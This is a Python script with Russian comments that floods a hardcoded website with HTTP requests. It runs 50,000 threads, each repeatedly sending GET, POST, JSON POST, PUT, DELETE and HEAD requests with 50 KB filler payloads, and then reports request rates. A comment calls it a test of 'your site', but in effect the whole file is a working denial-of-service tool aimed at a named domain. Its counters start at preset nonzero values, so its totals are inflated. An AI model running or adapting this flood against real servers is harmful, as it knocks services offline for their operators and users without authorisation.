import concurrent.futures
import requests
import time
import json
import threading
from functools import partial

# --- Настройки ---
TARGET_URL = "https://wotpack.ru"  # Замените на URL вашего сайта
NUM_THREADS = 50000  # Количество потоков
REQUESTS_PER_THREAD = 50000  # Количество запросов в каждом потоке
PAYLOAD_SIZE = 50000  # Размер данных для POST/PUT запроса (в байтах)

# --- Глобальные переменные ---
total_requests = 600000
get_requests = 100000
post_requests = 100000
post_json_requests = 100000
put_requests = 100000
delete_requests = 100000
head_requests = 100000  # Добавлено для HEAD-запросов
request_lock = threading.Lock()

def send_get_request():
    global total_requests, get_requests
    try:
        response = requests.get(TARGET_URL)
        if response.status_code == 200:
            with request_lock:
                total_requests += 1
                get_requests += 1
            return f"GET - Status: {response.status_code}"
        else:
            return f"GET - Ошибка {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"GET - Ошибка соединения: {e}"

def send_post_request():
    global total_requests, post_requests
    try:
        payload = {'data': 'A' * PAYLOAD_SIZE}
        response = requests.post(TARGET_URL, data=payload)
        if response.status_code == 200:
            with request_lock:
                total_requests += 1
                post_requests += 1
            return f"POST - Status: {response.status_code}"
        else:
            return f"POST - Ошибка {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"POST - Ошибка соединения: {e}"

def send_post_json_request():
    global total_requests, post_json_requests
    try:
        payload = {'data': 'A' * PAYLOAD_SIZE}
        json_payload = json.dumps(payload)
        headers = {'Content-Type': 'application/json'}
        response = requests.post(TARGET_URL, data=json_payload, headers=headers)
        if response.status_code == 200:
            with request_lock:
                total_requests += 1
                post_json_requests += 1
            return f"POST JSON - Status: {response.status_code}"
        else:
            return f"POST JSON - Ошибка {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"POST JSON - Ошибка соединения: {e}"

def send_put_request():
    global total_requests, put_requests
    try:
        payload = {'data': 'A' * PAYLOAD_SIZE}
        response = requests.put(TARGET_URL, data=payload)
        if response.status_code == 200:
            with request_lock:
                total_requests += 1
                put_requests += 1
            return f"PUT - Status: {response.status_code}"
        else:
            return f"PUT - Ошибка {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"PUT - Ошибка соединения: {e}"

def send_delete_request():
    global total_requests, delete_requests
    try:
        response = requests.delete(TARGET_URL)
        if response.status_code == 200:
            with request_lock:
                total_requests += 1
                delete_requests += 1
            return f"DELETE - Status: {response.status_code}"
        else:
            return f"DELETE - Ошибка {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"DELETE - Ошибка соединения: {e}"

def send_head_request():
    global total_requests, head_requests
    try:
        response = requests.head(TARGET_URL)
        if response.status_code == 200:
            with request_lock:
                total_requests += 1
                head_requests += 1
            return f"HEAD - Status: {response.status_code}"
        else:
            return f"HEAD - Ошибка {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"HEAD - Ошибка соединения: {e}"

def send_all_requests():
    get_result = send_get_request()
    post_result = send_post_request()
    json_result = send_post_json_request()
    put_result = send_put_request()
    delete_result = send_delete_request()
    head_result = send_head_request()  # Добавлен HEAD-запрос

    with request_lock:
        print(
            f"Поток {threading.current_thread().name}: {get_result}, {post_result}, {json_result}, {put_result}, {delete_result}, {head_result}. "
            f"Всего запросов: {total_requests} (GET: {get_requests}, POST: {post_requests}, POST_JSON: {post_json_requests}, PUT: {put_requests}, DELETE: {delete_requests}, HEAD: {head_requests})"
        )

def worker():
    for _ in range(REQUESTS_PER_THREAD):
        send_all_requests()
        # time.sleep(0.00000001)  # Небольшая задержка между запросами (опционально)

def main():
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(worker) for _ in range(NUM_THREADS)]
        concurrent.futures.wait(futures)

    end_time = time.time()
    duration = end_time - start_time

    print("\n--- Результаты ---")
    print(f"URL: {TARGET_URL}")
    print(f"Количество потоков: {NUM_THREADS}")
    print(f"Запросов в каждом потоке: {REQUESTS_PER_THREAD}")
    print(f"Всего отправлено запросов: {total_requests}")
    print(f"GET запросов: {get_requests}")
    print(f"POST запросов: {post_requests}")
    print(f"POST JSON запросов: {post_json_requests}")
    print(f"PUT запросов: {put_requests}")
    print(f"DELETE запросов: {delete_requests}")
    print(f"HEAD запросов: {head_requests}")  # Добавлено для HEAD-запросов
    print(f"Время выполнения: {duration:.2f} секунд")
    print(f"Запросов в секунду: {total_requests / duration:.2f}")

if __name__ == "__main__":
    main()